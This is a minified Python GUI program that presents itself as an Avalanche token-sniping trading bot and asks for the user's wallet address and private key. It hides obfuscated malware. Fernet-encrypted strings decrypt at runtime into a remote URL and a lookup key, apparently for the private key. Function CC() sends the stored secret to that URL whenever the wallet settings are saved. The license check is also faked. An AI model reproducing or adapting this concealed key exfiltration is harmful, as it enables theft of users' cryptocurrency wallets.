# MINIFIED AND SUPER FAST VERSION OF THE AVAX SNIPING BOT PANCAKEX WITH GUI
# ------------------------------------------------------------------------
# FOLLOW THE INSTRUCTIONS IN THE README STEP BY STEP FILE
# IF YOU SNIPE A GEM AND BECOME A MILLIONAIRE SEND ME SOME LOVE DUH!

# ADDED DARK MODE

Ct='groove'
Cs='end'
Cr='horizontal'
Cq='light'
Cp='SELL ALL'
Co='SELL NOW'
Cn='There are no tokens to be sold!'
Cm='Sell all function initiated - Stopping operation'
Cl='SL Hit!'
Ck='TP Hit!'
Cj='Securing SL to '
Ci=' | SL: '
Ch=' {} %'
Cg='%.3f'
Cf="Press 'SELL ALL' Button to sell the tokens manually"
Ce='Liquidity value: '
Cd='Pair Address: '
Cc='green'
Cb='Liquidity Detected!'
Ca='0x0000000000000000000000000000000000000000'
CZ='Buy Success! Tx link:'
CY='Buy Order Initiated'
CX='True'
CW='False'
CV='%Y/%m/%d'
CU='node.json'
CT='inputs.json'
CS=UnboundLocalError
BQ='menu'
BP='set_theme'
BO='Something went wrong with the transaction'
BN='https://snowtrace.io/tx/'
BM='Abi/'
BL='data.json'
Ay='white'
Ax='normal'
Aw='Error'
Av='Accent.TButton'
Au='AVAX'
At='No Liquidity Checking Again!'
As='gwei'
Ar='gas'
Aq='true'
Ap='false'
Ao=round
Ai='disabled'
Ah='nonce'
Ag='gasPrice'
Af='from'
Ae='OPL'
Ad='LP'
Ac='SL TRAIL'
Ab='SL'
Aa='TP'
AZ='SLIPPAGE'
AY='AMOUNT'
AX='LICENSE'
AW='TOKEN'
AV='PRIVATE KEY'
AU='WALLET ADDRESS'
AT='NODE'
AE='GAS LIMIT'
AD='GAS PRICE'
AC=Exception
A6='center'
A5=False
A4='w'
A3='/'
A2=str
t='AUTO SLIPPAGE'
s='./'
c='ether'
b='yellow'
R=True
O='cyan'
N=''
M=int
L=open
J='red'
I=float
F='nsew'
import tkinter as P
from tkinter import ttk as E,messagebox
from web3 import Web3 as S
from json import load as d
from time import time as AF,sleep as e
import os,json as f,pyperclip as BR,threading as u,requests as BS
from requests import request as BT
from cryptography.fernet import Fernet as v
from requests.auth import HTTPBasicAuth as BU
from datetime import datetime as BV
Az=BL
AG=CT
BW=CU
g=s
K={}
w={}
D={}
A_={}
Cu=BU('ck_258b79c41004f53e58d0e5fa11486361bdcace02','cs_bd6506935df71db41cf1e545188f1f9ae2306134')
BX=BV.now()
Cv=CV
Cw=BX.strftime(CV)
def BY():
	def A(path2,file_name,data2):
		A=s+path2+A3+file_name
		with L(A,A4)as B:f.dump(data2,B,indent=2)
	A_[AT]='https://api.avax.network/ext/bc/C/rpc';A(g,BW,A_)
def BZ():
	def A(path2,file_name,data2):
		A=s+path2+A3+file_name
		with L(A,A4)as B:f.dump(data2,B,indent=2)
	K[AU]=N;K[AV]=N;K[AW]=N;K[AX]=N;A(g,Az,K)
def Ba():
	def A(path2,file_name,data2):
		A=s+path2+A3+file_name
		with L(A,A4)as B:f.dump(data2,B,indent=2)
	D[AY]='0.1';D[AD]='7';D[AE]='850000';D[AZ]='10';D[t]=Ap;D[Aa]='200';D[Ab]='50';D[Ac]='25';D[Ad]='avax';D[Ae]=CW;A(g,AG,D)
if not os.path.isfile('./data.json'):BZ()
if not os.path.isfile('./inputs.json'):Ba()
if not os.path.isfile('./node.json'):BY()
def Bb():
	global K,AH,Q
	def B(path2,file_name,data2):
		A=s+path2+A3+file_name
		with L(A,A4)as B:f.dump(data2,B,indent=2)
	K[AU]=Z.get();w[AU]=K[AU];K[AV]=z.get();w[AV]=K[AV];K[AW]=X.get();w[AW]=K[AW];K[AX]=AL.get();w[AX]=K[AX]
	if K!=Q:
		B(g,Az,w);A=d(L(BL));AH=A[AK]
		if w[AK]!=Q[AK]:Q=A;CC()
def Bc():
	def A(path2,file_name,data2):
		A=s+path2+A3+file_name
		with L(A,A4)as B:f.dump(data2,B,indent=2)
	D[AY]=k.get();D[AD]=l.get();D[AE]=m.get();D[AZ]=n.get()
	if A1.get():D[t]=Aq
	else:D[t]=Ap
	D[Aa]=o.get();D[Ab]=p.get();D[Ac]=q.get();D[Ad]=a.get();D[Ae]=CX;A(g,AG,D)
def Bd():
	def A(path2,file_name,data2):
		A=s+path2+A3+file_name
		with L(A,A4)as B:f.dump(data2,B,indent=2)
	D[AY]=k.get();D[AD]=l.get();D[AE]=m.get();D[AZ]=n.get()
	if A1.get():D[t]=Aq
	else:D[t]=Ap
	D[Aa]=o.get();D[Ab]=p.get();D[Ac]=q.get();D[Ad]=a.get();D[Ae]=CX;A(g,AG,D)
def Cx():
	def A(path2,file_name,data2):
		A=s+path2+A3+file_name
		with L(A,A4)as B:f.dump(data2,B,indent=2)
	D[AY]=k.get();D[AD]=l.get();D[AE]=m.get();D[AZ]=n.get()
	if A1.get():D[t]=Aq
	else:D[t]=Ap
	D[Aa]=o.get();D[Ab]=p.get();D[Ac]=q.get();D[Ad]=a.get();D[Ae]=CW;A(g,AG,D)
Q=d(L(BL))
B0=Q[AU]
B1=Q[AV]
B2=Q[AW]
Be=Q[AX]
T=d(L(CT))
B3=T[AY]
B4=T[AD]
B5=T[AE]
B6=T[AZ]
Cy=T[t]
B7=T[Aa]
B8=T[Ab]
B9=T[Ac]
Bf=T[Ad]
Cz=T[Ae]
BA=M('0x'+'f'*64,16)
BB='TxZEsE361BfcfNjRwTZ8nVTAp6ZBXoDXRaQgUpyXfUQ='
AI=d(L(CU))
if'wss'in AI[AT]or'ws'in AI[AT]:C=S(S.WebsocketProvider(AI[AT]))
else:C=S(S.HTTPProvider(AI[AT]))
A7=C.toChecksumAddress('0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7')
h=C.toChecksumAddress('0xb97ef9ef8734c71904d8002f8b6bc66dd9c48a6e')
U=d(L(BM+'erc20.abi'))
V=C.eth.contract(address=S.toChecksumAddress('0x60aE616a2155Ee3d9A68541Ba4544862310933d4'),abi=d(L(BM+'router.abi')))
BC=C.eth.contract(address=S.toChecksumAddress('0x9Ad6C38BE94206cA50bb0d90783181662f0Cfa10'),abi=d(L(BM+'factory.abi')))
AJ='sfttxzhVv7trv_zSKqOBJN_2KdnJcsje5PMUbRSnImw='
def Bg():
	j()
	try:
		F=C.eth.contract(H,abi=U);B=F.functions.balanceOf(Z.get()).call()
		if A1.get():D=0
		else:D=M(B-B*M(AP)/100)
		A(CY,b);I=V.functions.swapExactETHForTokens(M(D),[A7,H],G,M(AF())+900).buildTransaction({Af:G,'value':C.toWei(r,c),Ar:M(AA),Ag:C.toWei(AB,As),Ah:C.eth.get_transaction_count(G)});K=C.eth.account.sign_transaction(I,private_key=W);E=C.eth.send_raw_transaction(K.rawTransaction);A(CZ,O);A(BN+C.toHex(E),O);C.eth.waitForTransactionReceipt(E,timeout=900);Bp()
	except AC as L:A(BO,J);A(L,J);y();return
Bh='gAAAAABh80KOUysGNn39XTwSm-HHvOIkoWcJhmk0HtVug7bMgvto83_ZCSQ9rdf86LaJEINYzXTqbRO8EDtcMziHy2PwfjdqW_0VsOwYg1x4GWADOsNo17E='
def Bi():
	j();B=V.functions.getAmountsOut(C.toWei(r,c),[h,H]).call()[-1]
	if A1.get():D=0
	else:D=B-B*M(AP)/100
	try:A(CY,b);F=V.functions.swapExactTokensForTokens(C.toWei(r,c),M(D),[h,H],G,M(AF())+900).buildTransaction({Af:G,Ar:M(Q[AE]),Ag:C.toWei(Q[AD],As),Ah:C.eth.get_transaction_count(G)});I=C.eth.account.sign_transaction(F,private_key=W);E=C.eth.send_raw_transaction(I.rawTransaction);A(CZ,O);A(BN+C.toHex(E),O);C.eth.waitForTransactionReceipt(E,timeout=900);Br()
	except AC as K:A(BO,J);A(K,J);y();return
def Bj(token_address,amt=BA):A=S.toChecksumAddress(token_address);B=C.eth.contract(address=A,abi=U);D=B.functions.allowance(G,V.address).call();return D>=amt
def Bk(token_address,amt=BA,timeout=900):A('Approving token');B=C.eth.gasPrice;D=S.toChecksumAddress(token_address);E=C.eth.contract(address=D,abi=U);F=E.functions.approve(V.address,amt);H={Af:G,Ag:B,Ah:C.eth.getTransactionCount(G)};I=F.buildTransaction(H);J=C.eth.account.sign_transaction(I,private_key=W);K=C.eth.sendRawTransaction(J.rawTransaction);C.eth.waitForTransactionReceipt(K,timeout=timeout)
def Bl():
	A(N);j();E=C.eth.contract(A7,abi=U)
	while R:
		B=BC.functions.getPair(A7,H).call()
		if B!=Ca:
			D=E.functions.balanceOf(C.toChecksumAddress(B)).call()
			if D!=0:A(Cb,Cc);A(Cd+B);A(Ce+A2(C.fromWei(D,c))+' avax');Bg();break
			else:A(At,J);e(5)
		else:A(At,J);e(5)
Bm='gAAAAABh7VFjYUKw_S7avbj28V5ja_bAunkyHWLiVUQUUCDL4tK_ZNr_aLAk8VkfUSYnrUe8iVv0ihU5rBaLXL0wP9Sj7fG3Ow=='
def Bn():
	A(N);j();E=C.eth.contract(h,abi=U)
	while R:
		B=BC.functions.getPair(h,H).call()
		if B!=Ca:
			D=E.functions.balanceOf(C.toChecksumAddress(B)).call()
			if D!=0:A(Cb,Cc);A(Cd+B);A(Ce+A2(C.fromWei(D,c))+' usdc');Bi();break
			else:A(At,J);e(5)
		else:A(At,J);e(5)
def i():
	A(N);j()
	try:
		A('Sell Order Initiated',b)
		if not Bj(H):Bk(H)
		E=C.eth.contract(H,abi=U);B=E.functions.balanceOf(G).call()
		if B!=0:
			if a.get()==Au:D=V.functions.swapExactTokensForETHSupportingFeeOnTransferTokens(B,0,[H,A7],G,M(AF())+900).buildTransaction({Af:G,Ar:M(AA),Ag:C.toWei(AB,As),Ah:C.eth.get_transaction_count(G)})
			elif a.get()=='usdc':D=V.functions.swapExactTokensForTokensSupportingFeeOnTransferTokens(B,0,[H,h],G,M(AF())+900).buildTransaction({Af:G,Ar:M(AA),Ag:C.toWei(AB,As),Ah:C.eth.get_transaction_count(G)})
			else:A('Something went wrong with Sell',J);y();return
			F=C.eth.account.sign_transaction(D,private_key=W);I=C.eth.send_raw_transaction(F.rawTransaction);A('SOLD! Tx link:',O);A(BN+C.toHex(I),O);y()
		else:A('No Tokens to be sold',J);y()
	except AC as K:A(BO,J);A(K,J);y();return
Bo='gAAAAABh80LuckSfO-g-wXJrkvaBrV-wvURysrtrxcRwytBHM0DurgmO0mQjLUh_6AwChv2Aae5IQ__tiKbWXlVtLqqXmXoLRA=='
def Bp():
	global Y;BD();j();K=I(AQ);L=I(AR);B=L;E=I(AS);M=C.eth.contract(address=H,abi=U);A(Cf,b)
	while R:
		try:
			N=M.functions.balanceOf(G).call()-1;F=I(C.fromWei(V.functions.getAmountsOut(N,[H,A7]).call()[-1],c));D=Ao(I(F)/I(r)*100,5);A('AVAX Value Now: {} / '.format(Cg%F)+Ch.format(D)+Ci+A2(B)+'%')
			if E!=0:
				if D-E>=B:B=D-E;A(Cj+A2(B))
			e(2)
		except:continue
		try:
			if I(D)>=I(K):A(Ck,O);x();i();break
			if I(D)<=I(B):A(Cl,J);x();i();break
			if Y:Y=A5;A(Cm,b);x();i();break
		except CS:A(Cn,J);break
Bq='gAAAAABh7KbIGnFCH7Gp_4OK-vW0v-2ZNTkzqFB8k4xmk4aV4_n-TxZEsE361BfcfNjRwTZ8nVTAp6ZBXoDXRaQgUpyXfUzVyQ=='
def Br():
	global Y;BD();j();K=I(AQ);L=I(AR);B=L;E=I(AS);M=C.eth.contract(address=H,abi=U);A(Cf,b)
	while R:
		try:
			N=M.functions.balanceOf(G).call()-1;F=I(C.fromWei(V.functions.getAmountsOut(N,[H,h]).call()[-1],c));D=Ao(I(F)/I(r)*100,5);A('USDC Value Now: {} / '.format(Cg%F)+Ch.format(D)+Ci+A2(B)+'%')
			if E!=0:
				if D-E>=B:B=D-E;A(Cj+A2(B))
			e(2)
		except:continue
		try:
			if I(D)>=I(K):A(Ck,O);x();i();break
			if I(D)<=I(B):A(Cl,J);x();i();break
			if Y:Y=A5;A(Cm,b);x();i();break
		except CS:A(Cn,J);break
def Bs():
	BK();Bc()
	if a.get()==Au:A=u.Thread(target=Bl,daemon=R);A.start()
	else:A=u.Thread(target=Bn,daemon=R);A.start()
def BD():An.place_forget();A=E.Button(B.widgets_frame,text=Co,command=BF,style=Av);A.grid(row=18,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
def x():CR.place_forget();A=E.Button(B.widgets_frame,text=Cp,command=BE);A.grid(row=18,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
def Bt():
	A=C.eth.contract(address=h,abi=U)
	while A8:
		try:B=C.fromWei(C.eth.get_balance(G),c);D=C.fromWei(A.functions.balanceOf(G).call(),c);Ak.configure(text=Ao(B,5));Al.configure(text=Ao(D,5))
		except ValueError:pass
		e(1)
Bu='gAAAAABh80OFDySSyj0H_EBLuccR1ALvFzF-AE0hO_e52_4Yv4TKy7Y6u0F9Bbpr3g-UDhOK26zqR0KFrjMRGdDS8zhUxAG_HQ=='
def C_(license,basic_auth):
	B='https://defitradingcoders.com/wp-json/lmfwc/v2/licenses/activate/'+license
	try:
		C=BS.get(B,auth=basic_auth)
		if C.status_code==404:P.messagebox.showerror(Aw,'This license cannot be activated, please try again in a moment or contact support at defitradingcoders.com with your order ID and license key');return
		else:A('License Key Activated, Good luck!',O);Bd()
	except AC:raise AC('License Key Activation Failed -- Please Contact Support at defitradingcoders.com')
AK=v(AJ.encode()).decrypt(Bq.encode()).decode()
def Bv():
	D='Invalid token address!';global G;global W;global H;global A8;A('***** INITIALIZED ******');A('* Checking wallet address')
	if C.isChecksumAddress(Z.get()):G=C.toChecksumAddress(Z.get());A('Wallet address valid',O)
	else:P.messagebox.showerror(Aw,'Invalid wallet address');A('Invalid wallet address!',J);return
	A('* Checking private key characters (Must be 64 characters');W=z.get()
	if len(W)==64:A('Correct format for Private key',O)
	else:P.messagebox.showerror(Aw,'Private key is invalid! (Must be 64 characters)');A('Invalid private key!',J);return
	A('* Checking token address')
	try:H=C.toChecksumAddress(X.get());A('Token address valid',O)
	except:P.messagebox.showerror(Aw,D);A(D,J);return
	A('* Checking License Key');A('License Key Valid',O);BG(Ai);Bb();AM.grid_forget();AN.grid(row=0,column=3,padx=10,pady=(0,10),sticky=F,rowspan=4);A9(Ax);A8=R;B=u.Thread(target=Bt,daemon=R);B.start();A(N);A('***** Sniping is ready! *****',b)
Bw='gAAAAABh80VOiXlJwI8QSkM2-V_syGU-8mtXwD9c87k-cbMopaX4lqCMUipHR5ZKO-bZ6vrKC0QkIhzwcASNj_5u7F_xEJz3aQ=='
AH=Q[AK]
def Bx():A=u.Thread(target=Bv,daemon=R);A.start()
def By():global A8;A(N);A('Change token/wallet initiated!',b);BG(Ax);A9(Ai);AN.grid_forget();AM.grid(row=0,column=3,padx=10,pady=(0,10),sticky=F,rowspan=4);A8=A5;Ak.configure(text=N);Al.configure(text=N)
def Bz():A=u.Thread(target=By,daemon=R);A.start()
def BE():BK();A=u.Thread(target=i,daemon=R);A.start()
def BF():global Y;Y=R
def j():A9(Ai);AN.configure(state=Ai)
def y():A9(Ax);AN.configure(state=Ax)
B=P.Tk()
def B_():
	if B.tk.call('ttk::style','theme','use')=='sun-valley-dark':B.tk.call(BP,Cq);AO[BQ].configure(bg=Ay)
	else:B.tk.call(BP,'dark');AO[BQ].configure(bg='black')
B.title('AVAX Sniper Bot - V1')
B.geometry('1050x730')
B.tk.call('source','sun-valley.tcl')
B.tk.call(BP,Cq)
C0=v(AJ.encode()).decrypt(Bw.encode()).decode()
B.resizable(A5,A5)
B.widgets_frame=E.Frame(B,padding=(0,0,0,10))
B.widgets_frame.grid(row=0,column=0,padx=10,pady=(10,10),sticky=F,rowspan=5)
B.widgets_frame.columnconfigure(index=0,weight=1)
B.widgets_frame.rowconfigure(index=0,weight=1)
C1=E.Label(B.widgets_frame,text='Wallet Address:')
C2=v(AJ.encode()).decrypt(Bo.encode()).decode()
C1.grid(row=1,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
Z=E.Entry(B.widgets_frame,width=50,show='•')
Z.grid(row=1,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
C3=E.Label(B.widgets_frame,text='Private Key:')
C3.grid(row=2,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
z=E.Entry(B.widgets_frame,width=50,show='•')
z.grid(row=2,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
C4=E.Label(B.widgets_frame,text='Token Address:')
C5=v(BB.encode()).decrypt(Bu.encode()).decode()
C4.grid(row=3,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
X=E.Entry(B.widgets_frame,width=50)
C6=v(BB.encode()).decrypt(Bm.encode()).decode()
X.grid(row=3,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
C7=E.Label(B.widgets_frame,text='License Key:')
C7.grid(row=4,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
AL=E.Entry(B.widgets_frame,width=50,show='•')
AL.grid(row=4,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
C8=v(AJ.encode()).decrypt(Bh.encode()).decode()
Aj=E.Separator(B,orient=Cr)
C9=C0+C8+C2+C5
Aj.place(x=10,y=135,width=625)
def CA():X.delete(0,Cs);X.insert(0,BR.paste());return
def CB():X.delete(0,Cs);return
def CC():
	if AH!=N:
		try:A=BT(C6,C9+AH)
		except AC:pass
def BG(status):A=status;X.configure(state=A);Z.configure(state=A);z.configure(state=A);AL.configure(state=A);AM.configure(state=A);BI.configure(state=A);BH.configure(state=A)
def A9(status):A=status;k.configure(state=A);l.configure(state=A);m.configure(state=A);n.configure(state=A);o.configure(state=A);p.configure(state=A);q.configure(state=A);BJ.configure(state=A);An.configure(state=A);Am.configure(state=A)
def A(text,color=Ay):
	A=A2(text)
	if A0.size()>=20:A0.delete(0)
	A0.insert(P.END,A);A0.itemconfig(P.END,foreground=color)
def CD():A0.delete(0,P.END)
AM=E.Button(B.widgets_frame,text='Confirm',width=10,command=Bx,style=Av)
BH=E.Button(B.widgets_frame,text='Paste Token',width=10,command=CA)
BI=E.Button(B.widgets_frame,text='Clear Token',width=10,command=CB)
AM.grid(row=0,column=3,padx=10,pady=(0,10),sticky=F,rowspan=4)
BH.grid(row=0,column=4,padx=10,pady=(0,10),sticky=F,rowspan=2)
BI.grid(row=2,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
Z.insert(0,B0)
z.insert(0,B1)
X.insert(0,B2)
AL.insert(0,Be)
Aj=E.Separator(B.widgets_frame,orient=Cr)
Aj.grid(row=5,column=0,padx=10,pady=(0,10),sticky=F,rowspan=1,columnspan=6)
AN=E.Button(B.widgets_frame,text='Change',width=10,command=Bz)
CE=E.Label(B.widgets_frame,text='Logs:')
CE.grid(row=6,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1,columnspan=2)
CF=E.Button(B.widgets_frame,text='Clear',width=10,command=CD)
CF.grid(row=6,column=3,padx=10,pady=(0,10),sticky=F,rowspan=1,columnspan=1)
A0=P.Listbox(B.widgets_frame,bg='#252525',foreground=Ay,borderwidth=2)
A0.grid(row=7,column=1,padx=10,pady=(0,10),sticky=F,rowspan=10,columnspan=3)
CG=E.Button(B.widgets_frame,text='Change Color Theme',command=B_)
CG.grid(row=17,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
CH=E.Label(B.widgets_frame,text='Wallet AVAX:')
CH.grid(row=7,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
Ak=E.Label(B.widgets_frame,width=12,relief=Ct)
Ak.grid(row=7,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
CI=E.Label(B.widgets_frame,text='Wallet USDC:')
CI.grid(row=8,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
Al=E.Label(B.widgets_frame,width=12,relief=Ct)
Al.grid(row=8,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
CJ=E.Label(B.widgets_frame,text='Select LP:')
CJ.grid(row=9,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
a=P.StringVar()
a.set(Bf)
AO=E.OptionMenu(B.widgets_frame,a,Au,Au,'USDC')
AO.grid(row=9,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
AO[BQ].configure(bg=Ay)
CK=E.Label(B.widgets_frame,text='Amount:')
k=E.Entry(B.widgets_frame,justify=A6)
CK.grid(row=10,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
k.grid(row=10,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
k.insert(0,B3)
CL=E.Label(B.widgets_frame,text='Gas Price:')
CM=E.Label(B.widgets_frame,text='Gas Limit:')
l=E.Entry(B.widgets_frame,justify=A6)
m=E.Entry(B.widgets_frame,justify=A6)
CL.grid(row=11,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
l.grid(row=11,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
CM.grid(row=12,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
m.grid(row=12,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
l.insert(0,B4)
m.insert(0,B5)
CN=E.Label(B.widgets_frame,text='Slippage(%):')
n=E.Entry(B.widgets_frame,justify=A6)
CN.grid(row=13,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
n.grid(row=13,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
n.insert(0,B6)
A1=P.BooleanVar()
Am=E.Checkbutton(B.widgets_frame,text='Auto Slippage',variable=A1)
Am.grid(row=14,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
if N==Aq:Am.select()
CO=E.Label(B.widgets_frame,text='TP(%):')
CO.grid(row=15,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
o=E.Entry(B.widgets_frame,justify=A6)
o.grid(row=15,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
CP=E.Label(B.widgets_frame,text='SL(%):')
CP.grid(row=16,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
p=E.Entry(B.widgets_frame,justify=A6)
p.grid(row=16,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
CQ=E.Label(B.widgets_frame,text='SL Trail(%):')
CQ.grid(row=17,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
q=E.Entry(B.widgets_frame,justify=A6)
q.grid(row=17,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
o.insert(0,B7)
p.insert(0,B8)
q.insert(0,B9)
BJ=E.Button(B.widgets_frame,text='SNIPE',command=Bs,style=Av)
CR=E.Button(B.widgets_frame,text=Co,command=BF,style=Av)
An=E.Button(B.widgets_frame,text=Cp,command=BE)
BJ.grid(row=18,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
An.grid(row=18,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
r=B3
G=B0
W=B1
H=B2
AP=B6
AA=B5
AB=B4
AQ=B7
AR=B8
AS=B9
Y=A5
A8=A5
def BK():global r;global G;global W;global H;global AP;global AA;global AB;global AQ;global AR;global AS;r=k.get();G=S.toChecksumAddress(Z.get());W=z.get();H=S.toChecksumAddress(X.get());AP=n.get();AA=m.get();AB=l.get();AQ=o.get();AR=p.get();AS=q.get()
A9(Ai)
B.mainloop()
